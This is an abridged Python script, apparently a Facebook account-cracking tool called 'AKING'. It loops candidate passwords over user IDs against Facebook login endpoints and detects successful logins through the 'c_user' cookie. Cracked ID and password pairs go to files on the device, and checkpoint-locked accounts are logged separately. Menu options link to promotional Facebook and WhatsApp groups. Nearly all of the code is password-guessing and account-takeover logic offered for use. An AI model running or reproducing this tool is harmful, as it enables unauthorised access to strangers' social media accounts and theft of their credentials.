...
def Main():
	...
	if Aking =='3':
		Random_M3()
	if Aking =='4':
		os.system('xdg-open https://facebook.com/groups/351076900316263/');Main()
	if Aking =='5':
		os.system('xdg-open https://chat.whatsapp.com/J4aPp7OZiDeBHutysMEG1U');Main()
	if Aking =='0':
		exit('[•] Thanks For Use\n[•] See U Again ')
	else:
...
def Random():
	...
	print('\033[1;37m(!)══════════════════════════════════════════')
	print('[•] OK IDS SAVE : /sdcard/AKING-OK.txt\n[•] CP IDS SAVE : /sdcard/AKING-CP.txt')
	input('[•] Press Enter To Back Menu ');os.system('python AKING.py')
def mbasic(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			...
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':"b-api.facebook.com",
			'method':'GET',
			'path':'/',
			'scheme':'https',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\r\033[1;32m[AKING-OK] '+cid+' | '+ps)
				cek_apk(session,coki)
				open('/sdcard/AKNG-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid=coki[24:39]
				Red = '\x1b[38;5;208m'
				print(f'\r{Red}[AKING-CP] '+cid+' | '+ps+'\033[1;97m')
				open('/sdcard/AKNG-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
			else:
				continue
		loop+=1
		sys.stdout.write('\r%s[MR•AKING] %s|OK:-%s'%(bi,loop,len(oks))),
		sys.stdout.flush()
	except:
		pass	
Main()
